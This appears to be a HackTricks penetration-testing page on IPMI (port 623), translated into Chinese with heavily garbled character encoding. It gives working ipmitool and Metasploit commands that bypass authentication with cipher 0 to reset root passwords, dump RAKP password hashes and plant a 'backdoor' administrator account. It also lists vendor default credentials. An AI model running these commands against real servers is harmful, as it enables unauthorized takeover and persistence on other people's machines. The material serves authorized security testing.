# 623/UDP/TCP - IPMI

## 623/UDP/TCP - IPMI

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## åŸºæœ¬ä¿¡æ¯

[Intelligent Platform Management Interface](https://www.thomas-krenn.com/en/wiki/IPMI\_Basics)ï¼ˆ`IPMI`ï¼‰æ˜¯ä¸€ç»„ç”¨äºç¡¬ä»¶ä¸»æœºç®¡ç†ç³»ç»Ÿçš„æ ‡å‡†åŒ–è§„èŒƒï¼Œç”¨äºç³»ç»Ÿç®¡ç†å’Œç›‘æ§ã€‚å®ƒä½œä¸ºä¸€ä¸ªç‹¬ç«‹çš„å­ç³»ç»Ÿå·¥ä½œï¼Œç‹¬ç«‹äºä¸»æœºçš„BIOSã€CPUã€å›ºä»¶å’Œåº•å±‚æ“ä½œç³»ç»Ÿã€‚IPMIä½¿ç³»ç»Ÿç®¡ç†å‘˜èƒ½å¤Ÿç®¡ç†å’Œç›‘æ§ç³»ç»Ÿï¼Œå³ä½¿å®ƒä»¬å¤„äºå…³é—­æˆ–æ— å“åº”çŠ¶æ€ã€‚å®ƒé€šè¿‡ç›´æ¥çš„ç½‘ç»œè¿æ¥åˆ°ç³»ç»Ÿçš„ç¡¬ä»¶è¿›è¡Œæ“ä½œï¼Œä¸éœ€è¦é€šè¿‡ç™»å½•shellè®¿é—®æ“ä½œç³»ç»Ÿã€‚IPMIè¿˜å¯ä»¥ç”¨äºå¯¹ç³»ç»Ÿè¿›è¡Œè¿œç¨‹å‡çº§ï¼Œè€Œæ— éœ€ç‰©ç†è®¿é—®ç›®æ ‡ä¸»æœºã€‚IPMIé€šå¸¸ä»¥ä»¥ä¸‹ä¸‰ç§æ–¹å¼ä½¿ç”¨ï¼š

* åœ¨æ“ä½œç³»ç»Ÿå¼•å¯¼ä¹‹å‰ä¿®æ”¹BIOSè®¾ç½®
* å½“ä¸»æœºå®Œå…¨å…³é—­æ—¶
* åœ¨ç³»ç»Ÿæ•…éšœåè®¿é—®ä¸»æœº

å½“ä¸ç”¨äºè¿™äº›ä»»åŠ¡æ—¶ï¼ŒIPMIå¯ä»¥ç›‘è§†å„ç§ä¸åŒçš„äº‹ç‰©ï¼Œå¦‚ç³»ç»Ÿæ¸©åº¦ã€ç”µå‹ã€é£æ‰‡çŠ¶æ€å’Œç”µæºä¾›åº”ã€‚å®ƒè¿˜å¯ä»¥ç”¨äºæŸ¥è¯¢åº“å­˜ä¿¡æ¯ã€æŸ¥çœ‹ç¡¬ä»¶æ—¥å¿—å’Œä½¿ç”¨SNMPè¿›è¡Œè­¦æŠ¥ã€‚ä¸»æœºç³»ç»Ÿå¯ä»¥å…³é—­ç”µæºï¼Œä½†IPMIæ¨¡å—éœ€è¦ç”µæºå’ŒLANè¿æ¥æ‰èƒ½æ­£å¸¸å·¥ä½œã€‚

IPMIåè®®æœ€åˆç”±è‹±ç‰¹å°”äº1998å¹´å‘å¸ƒï¼Œç°åœ¨ç”±200å¤šä¸ªç³»ç»Ÿä¾›åº”å•†æ”¯æŒï¼ŒåŒ…æ‹¬æ€ç§‘ã€æˆ´å°”ã€æƒ æ™®ã€è¶…å¾®ã€è‹±ç‰¹å°”ç­‰ã€‚ä½¿ç”¨IPMI 2.0ç‰ˆæœ¬çš„ç³»ç»Ÿå¯ä»¥é€šè¿‡ä¸²è¡Œå±€åŸŸç½‘è¿›è¡Œç®¡ç†ï¼Œä½¿ç³»ç»Ÿç®¡ç†å‘˜èƒ½å¤Ÿåœ¨å¸¦å†…æŸ¥çœ‹ä¸²è¡Œæ§åˆ¶å°è¾“å‡ºã€‚ä¸ºäº†æ­£å¸¸å·¥ä½œï¼ŒIPMIéœ€è¦ä»¥ä¸‹ç»„ä»¶ï¼š

* ä¸»æ¿ç®¡ç†æ§åˆ¶å™¨ï¼ˆBMCï¼‰- IPMIçš„å¾®æ§åˆ¶å™¨å’ŒåŸºæœ¬ç»„ä»¶
* æ™ºèƒ½æœºç®±ç®¡ç†æ€»çº¿ï¼ˆICMBï¼‰- å…è®¸ä¸€ä¸ªæœºç®±ä¸å¦ä¸€ä¸ªæœºç®±è¿›è¡Œé€šä¿¡çš„æ¥å£
* æ™ºèƒ½å¹³å°ç®¡ç†æ€»çº¿ï¼ˆIPMBï¼‰- æ‰©å±•BMC
* IPMIå†…å­˜- å­˜å‚¨ç³»ç»Ÿäº‹ä»¶æ—¥å¿—ã€å­˜å‚¨åº“æ•°æ®ç­‰
* é€šä¿¡æ¥å£- æœ¬åœ°ç³»ç»Ÿæ¥å£ã€ä¸²è¡Œå’ŒLANæ¥å£ã€ICMBå’ŒPCIç®¡ç†æ€»çº¿

![](https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right)

**é»˜è®¤ç«¯å£**ï¼š623/UDP/TCPï¼ˆé€šå¸¸ä½¿ç”¨UDPï¼Œä½†ä¹Ÿå¯ä»¥åœ¨TCPä¸Šè¿è¡Œï¼‰

## æšä¸¾

### å‘ç°
```bash
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
use  auxiliary/scanner/ipmi/ipmi_version
```
æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•**è¯†åˆ«**ç‰ˆæœ¬ï¼š
```bash
use auxiliary/scanner/ipmi/ipmi_version
nmap -sU --script ipmi-version -p 623 10.10.10.10
```
### æ¼æ´ - é€šè¿‡å¯†ç 0ç»•è¿‡IPMIèº«ä»½éªŒè¯

Dan Farmer [å‘ç°äº†IPMI 2.0è§„èŒƒçš„ä¸€ä¸ªä¸¥é‡ç¼ºé™·](http://fish2.com/ipmi/cipherzero.html)ï¼Œå³å¯†ç ç±»å‹0ï¼Œè¡¨ç¤ºå®¢æˆ·ç«¯å¸Œæœ›ä½¿ç”¨æ˜æ–‡èº«ä»½éªŒè¯ï¼Œå®é™…ä¸Š**å…è®¸ä½¿ç”¨ä»»ä½•å¯†ç **è¿›è¡Œè®¿é—®ã€‚åœ¨HPã€Dellå’ŒSupermicro BMCä¸­å‘ç°äº†å¯†ç 0çš„é—®é¢˜ï¼Œè¯¥é—®é¢˜å¯èƒ½æ¶µç›–æ‰€æœ‰IPMI 2.0å®ç°ã€‚\
è¯·æ³¨æ„ï¼Œè¦åˆ©ç”¨æ­¤é—®é¢˜ï¼Œæ‚¨é¦–å…ˆéœ€è¦**æ‰¾åˆ°ä¸€ä¸ªæœ‰æ•ˆçš„ç”¨æˆ·**ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•**è¯†åˆ«**æ­¤é—®é¢˜ï¼š
```
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```
è€Œä¸”ä½ å¯ä»¥ä½¿ç”¨`ipmitool`æ¥**æ»¥ç”¨**è¿™ä¸ªé—®é¢˜ï¼š
```bash
apt-get install ipmitool #Install
#Using -C 0 any password is accepted
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list #Use Cipher 0 to dump a list of users
ID  Name      Callin  Link Auth   IPMI Msg   Channel Priv Limit
2   root             true    true       true       ADMINISTRATOR
3   Oper1            true    true       true       ADMINISTRATOR
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 #Change the password of root
```
### æ¼æ´ - IPMI 2.0 RAKPè®¤è¯è¿œç¨‹å¯†ç å“ˆå¸Œæ£€ç´¢

åŸºæœ¬ä¸Šï¼Œ**ä½ å¯ä»¥å‘æœåŠ¡å™¨è¯·æ±‚ä»»ä½•ç”¨æˆ·åçš„ç›å€¼å“ˆå¸ŒMD5å’ŒSHA1ï¼Œå¦‚æœç”¨æˆ·åå­˜åœ¨ï¼Œè¿™äº›å“ˆå¸Œå€¼å°†è¢«å‘é€å›æ¥ã€‚** æ˜¯çš„ï¼Œå¬èµ·æ¥å¾ˆç¥å¥‡ã€‚è€Œä¸”è¿˜æœ‰ä¸€ä¸ª**Metasploitæ¨¡å—**å¯ä»¥ç”¨äºæµ‹è¯•ï¼ˆä½ å¯ä»¥é€‰æ‹©Johnæˆ–Hashcatæ ¼å¼çš„è¾“å‡ºï¼‰ï¼š
```bash
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
```
_è¯·æ³¨æ„ï¼Œå¯¹äºæ­¤æ“ä½œï¼Œæ‚¨åªéœ€è¦ä¸€ä¸ªç”¨æˆ·ååˆ—è¡¨æ¥è¿›è¡Œæš´åŠ›ç ´è§£ï¼ˆmetasploitå·²ç»åŒ…å«äº†ä¸€ä¸ªå¸¦æœ‰é»˜è®¤ç”¨æˆ·åçš„åˆ—è¡¨ï¼‰ã€‚_

ä½¿ç”¨`ipmitool`ç»•è¿‡èº«ä»½éªŒè¯ï¼ˆ`-c 0`ï¼‰æ¥å°†rootå¯†ç æ›´æ”¹ä¸ºabc123ï¼š
```
root@kali:~# apt-get install ipmitool
root@kali:~# ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list
ID  Name      Callin  Link Auth   IPMI Msg   Channel Priv Limit
2   root             true    true       true       ADMINISTRATOR
3   Oper1            true    true       true       ADMINISTRATOR
root@kali:~# ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123
```
### æ¼æ´ - IPMIåŒ¿åè®¤è¯

é™¤äº†ä¸Šè¿°çš„è®¤è¯é—®é¢˜å¤–ï¼Œä¸¹Â·æ³•å°”é»˜è¿˜æŒ‡å‡ºï¼Œ**è®¸å¤šBMCé»˜è®¤å¯ç”¨äº†â€œåŒ¿åâ€è®¿é—®**ã€‚è¿™æ˜¯é€šè¿‡å°†ç¬¬ä¸€ä¸ª**ç”¨æˆ·**è´¦æˆ·çš„ç”¨æˆ·åè®¾ç½®ä¸º**ç©ºå­—ç¬¦ä¸²**ï¼Œå¹¶å°†**ç©ºå¯†ç **è®¾ç½®ä¸ºåŒ¹é…æ¥é…ç½®çš„ã€‚_ipmi\_dumphashes_æ¨¡å—å°†è¯†åˆ«å¹¶è½¬å‚¨ç©ºç”¨æˆ·è´¦æˆ·çš„å¯†ç å“ˆå¸Œï¼ˆåŒ…æ‹¬ç©ºå¯†ç ï¼‰ã€‚**è¿™ä¸ªè´¦æˆ·æœ¬èº«å¯èƒ½éš¾ä»¥ä½¿ç”¨ï¼Œä½†æˆ‘ä»¬å¯ä»¥åˆ©ç”¨`ipmitool`é‡ç½®å‘½åç”¨æˆ·è´¦æˆ·çš„å¯†ç ï¼Œå¹¶åˆ©ç”¨è¯¥è´¦æˆ·è®¿é—®å…¶ä»–æœåŠ¡ï¼š
```bash
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list

ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
1                    false  false      true      ADMINISTRATOR
2  root            false  false      true      ADMINISTRATOR
3  admin            true    true      true      ADMINISTRATOR

ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword #Change the password of the user 2 (root) to "newpassword"
```
### æ¼æ´ - Supermicro IPMIæ˜æ–‡å¯†ç 

IPMI 2.0è§„èŒƒè¦æ±‚BMCå“åº”åŸºäºHMACçš„èº«ä»½éªŒè¯æ–¹æ³•ï¼Œå¦‚SHA1å’ŒMD5ã€‚è¿™ç§èº«ä»½éªŒè¯è¿‡ç¨‹å­˜åœ¨ä¸€äº›ä¸¥é‡çš„å¼±ç‚¹ï¼Œæ­£å¦‚ä¹‹å‰çš„ç¤ºä¾‹æ‰€ç¤ºï¼Œä½†ä¹Ÿ**éœ€è¦è®¿é—®æ˜æ–‡å¯†ç ä»¥è®¡ç®—èº«ä»½éªŒè¯å“ˆå¸Œ**ã€‚è¿™æ„å‘³ç€BMCå¿…é¡»åœ¨**éæ˜“å¤±æ€§å­˜å‚¨å™¨**ä¸­å­˜å‚¨æ‰€æœ‰é…ç½®çš„ç”¨æˆ·å¯†ç çš„**æ˜æ–‡ç‰ˆæœ¬**ã€‚åœ¨**Supermicro**çš„æƒ…å†µä¸‹ï¼Œæ­¤ä½ç½®åœ¨å›ºä»¶ç‰ˆæœ¬ä¹‹é—´ä¼šå‘ç”Ÿå˜åŒ–ï¼Œä½†è¦ä¹ˆæ˜¯**`/nv/PSBlock`**ï¼Œè¦ä¹ˆæ˜¯**`/nv/PSStore`**ã€‚å¯†ç åˆ†æ•£åœ¨å„ç§äºŒè¿›åˆ¶å—ä¹‹é—´ï¼Œä½†å¾ˆå®¹æ˜“è¯†åˆ«ï¼Œå› ä¸ºå®ƒä»¬æ€»æ˜¯è·Ÿéšç”¨æˆ·åã€‚å¯¹äºä»»ä½•ä½¿ç”¨BMCä¹‹é—´æˆ–ç”šè‡³ä¸åŒç±»å‹è®¾å¤‡ä¹‹é—´å…±äº«å¯†ç çš„ç»„ç»‡æ¥è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸¥é‡çš„é—®é¢˜ã€‚
```bash
cat /nv/PSBlock
admin                      ADMINpassword^TT                    rootOtherPassword!
```
### æ¼æ´ - Supermicro IPMI UPnP

Supermicroåœ¨å…¶æœ€æ–°çš„è®¸å¤šä¸»æ¿çš„IPMIå›ºä»¶ä¸ŠåŒ…å«ä¸€ä¸ªè¿è¡Œåœ¨UDPç«¯å£1900ä¸Šçš„UPnP SSDPç›‘å¬å™¨ã€‚åœ¨SMT\_X9\_218ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œè¯¥æœåŠ¡è¿è¡Œçš„æ˜¯Intel SDK for UPnP Devicesçš„1.3.1ç‰ˆæœ¬ã€‚è¿™ä¸ªç‰ˆæœ¬å­˜åœ¨[ç”±Rapid7åœ¨2013å¹´2æœˆæŠ«éœ²çš„é—®é¢˜](https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play)ï¼Œå¹¶ä¸”Metasploit Frameworkä¸­åŒ…å«äº†é’ˆå¯¹è¿™ä¸ªå¹³å°çš„åˆ©ç”¨å·¥å…·ã€‚è¿™ç§æ”»å‡»çš„æœ‰è¶£ä¹‹å¤„åœ¨äºå®ƒå¯ä»¥è·å¾—å¯¹BMCçš„å®Œå…¨rootè®¿é—®æƒé™ï¼Œè€Œè¿™åœ¨å…¶ä»–æƒ…å†µä¸‹å¾ˆéš¾è·å¾—ã€‚è¯·è®°ä½ï¼Œå…·æœ‰ç®¡ç†è®¿é—®æƒé™çš„æ”»å‡»è€…ï¼Œæ— è®ºæ˜¯é€šè¿‡ç½‘ç»œè¿˜æ˜¯ä»ä¸»æœºç³»ç»Ÿçš„root shellï¼Œéƒ½å¯ä»¥å°†Supermicro BMCçš„å›ºä»¶é™çº§åˆ°ä¸€ä¸ªå­˜åœ¨æ¼æ´çš„ç‰ˆæœ¬ï¼Œç„¶ååˆ©ç”¨å®ƒã€‚ä¸€æ—¦è·å¾—rootè®¿é—®æƒé™ï¼Œå°±å¯ä»¥ä»æ–‡ä»¶ç³»ç»Ÿä¸­è¯»å–æ˜æ–‡å‡­æ®ï¼Œå®‰è£…å…¶ä»–è½¯ä»¶ï¼Œå¹¶å°†æ°¸ä¹…åé—¨é›†æˆåˆ°BMCä¸­ï¼Œå³ä½¿ä¸»æœºæ“ä½œç³»ç»Ÿè¿›è¡Œäº†å®Œå…¨é‡æ–°å®‰è£…ï¼Œåé—¨ä»ç„¶å­˜åœ¨ã€‚
```bash
msf> use exploit/multi/upnp/libupnp_ssdp_overflow
```
### æš´åŠ›ç ´è§£

è¯·æ³¨æ„ï¼Œåªæœ‰æƒ æ™®ï¼ˆHPï¼‰åœ¨åˆ¶é€ è¿‡ç¨‹ä¸­å¯¹å¯†ç è¿›è¡ŒéšæœºåŒ–ã€‚

| äº§å“åç§°                                        | é»˜è®¤ç”¨æˆ·å     | é»˜è®¤å¯†ç                                  |
| ----------------------------------------------- | -------------- | ---------------------------------------- |
| **HP Integrated Lights Out (iLO)**               | Administrator  | \<å·¥å‚éšæœºåŒ–çš„8ä½å­—ç¬¦>                     |
| **Dell Remote Access Card (iDRAC, DRAC)**        | root           | calvin                                   |
| **IBM Integrated Management Module (IMM)**       | USERID         | PASSW0RDï¼ˆ0ä¸ºé›¶ï¼‰                        |
| **Fujitsu Integrated Remote Management Controller** | admin        | admin                                    |
| **Supermicro IPMI (2.0)**                        | ADMIN          | ADMIN                                    |
| **Oracle/Sun Integrated Lights Out Manager (ILOM)** | root         | changeme                                 |
| **ASUS iKVM BMC**                                | admin          | admin                                    |

## ä»BMCæ”»å‡»ä¸»æœº

ä¸€æ—¦è·å¾—å¯¹BMCçš„ç®¡ç†å‘˜è®¿é—®æƒé™ï¼Œå°±å¯ä»¥ä½¿ç”¨å¤šç§æ–¹æ³•æ¥è®¿é—®ä¸»æœºæ“ä½œç³»ç»Ÿã€‚æœ€ç›´æ¥çš„æ–¹æ³•æ˜¯æ»¥ç”¨BMCçš„KVMåŠŸèƒ½ï¼Œå¹¶å°†ä¸»æœºé‡å¯åˆ°root shellï¼ˆåœ¨GRUBä¸­ä½¿ç”¨init=/bin/shï¼‰æˆ–æŒ‡å®šä¸€ä¸ªæ•‘æ´ç›˜ä½œä¸ºè™šæ‹ŸCD-ROMå¹¶å¼•å¯¼åˆ°è¯¥ç›˜ã€‚ä¸€æ—¦è·å¾—å¯¹ä¸»æœºç£ç›˜çš„åŸå§‹è®¿é—®æƒé™ï¼Œå°±å¯ä»¥è½»æ¾å¼•å…¥åé—¨ï¼Œä»ç¡¬ç›˜å¤åˆ¶æ•°æ®ï¼Œæˆ–è€…æ‰§è¡Œä»»ä½•éœ€è¦è¿›è¡Œçš„å®‰å…¨è¯„ä¼°çš„æ“ä½œã€‚å½“ç„¶ï¼Œè¿™ç§æ–¹æ³•çš„ä¸€ä¸ªå¾ˆå¤§çš„ç¼ºç‚¹æ˜¯å¿…é¡»é‡æ–°å¯åŠ¨ä¸»æœºæ‰èƒ½ä½¿ç”¨ã€‚è®¿é—®æ­£åœ¨è¿è¡Œçš„ä¸»æœºè¦å›°éš¾å¾—å¤šï¼Œè¿™å–å†³äºä¸»æœºæ­£åœ¨è¿è¡Œçš„å†…å®¹ã€‚å¦‚æœä¸»æœºçš„ç‰©ç†æ§åˆ¶å°å¤„äºç™»å½•çŠ¶æ€ï¼Œä½¿ç”¨å†…ç½®çš„KVMåŠŸèƒ½è½»æ¾åŠ«æŒå®ƒã€‚ä¸²è¡Œæ§åˆ¶å°ä¹Ÿæ˜¯å¦‚æ­¤-å¦‚æœä¸²è¡Œç«¯å£è¿æ¥åˆ°ç»è¿‡èº«ä»½éªŒè¯çš„ä¼šè¯ï¼Œåˆ™BMCå¯èƒ½å…è®¸ä½¿ç”¨ipmitoolæ¥å£è¿›è¡Œä¸²è¡Œå±€åŸŸç½‘ï¼ˆsolï¼‰çš„åŠ«æŒã€‚ä»éœ€è¦è¿›è¡Œæ›´å¤šç ”ç©¶çš„ä¸€æ¡è·¯å¾„æ˜¯æ»¥ç”¨å¯¹å…±äº«ç¡¬ä»¶çš„è®¿é—®æƒé™ï¼Œä¾‹å¦‚i2cæ€»çº¿å’ŒSuper I/OèŠ¯ç‰‡ã€‚

![](https://blog.rapid7.com/content/images/post-images/27966/ipmi\_bios.png)

![](https://blog.rapid7.com/content/images/post-images/27966/ipmi\_boot.png)

![](<../.gitbook/assets/image (202) (2).png>)

## ä»ä¸»æœºæ”»å‡»BMC

åœ¨ä¸»æœºå¸¦æœ‰BMCå¹¶è¢«å…¥ä¾µçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨**æœ¬åœ°æ¥å£æ¥å¼•å…¥ä¸€ä¸ªåé—¨ç”¨æˆ·è´¦æˆ·**ï¼Œä»è€Œåœ¨æœåŠ¡å™¨ä¸Šå»ºç«‹ä¸€ä¸ªæ°¸ä¹…ç«‹è¶³ç‚¹ã€‚æ­¤æ”»å‡»éœ€è¦åœ¨ä¸»æœºä¸Šå®‰è£…**`ipmitool`**å¹¶å¯ç”¨å¯¹BMCçš„é©±åŠ¨ç¨‹åºæ”¯æŒã€‚ä¸‹é¢çš„ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨ä¸»æœºä¸Šçš„æœ¬åœ°æ¥å£ï¼ˆä¸éœ€è¦èº«ä»½éªŒè¯ï¼‰å°†æ–°ç”¨æˆ·è´¦æˆ·æ³¨å…¥åˆ°BMCä¸­ã€‚æ­¤æ–¹æ³•é€‚ç”¨äºLinuxã€Windowsã€BSDç”šè‡³DOSç›®æ ‡ã€‚
```bash
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)

ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)
4  backdoor        true    false      true      ADMINISTRATOR
```
## Shodan

* `port:623`

## å‚è€ƒèµ„æ–™

* [https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)
* [https://academy.hackthebox.com/module/112/section/1245](https://academy.hackthebox.com/module/112/section/1245)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
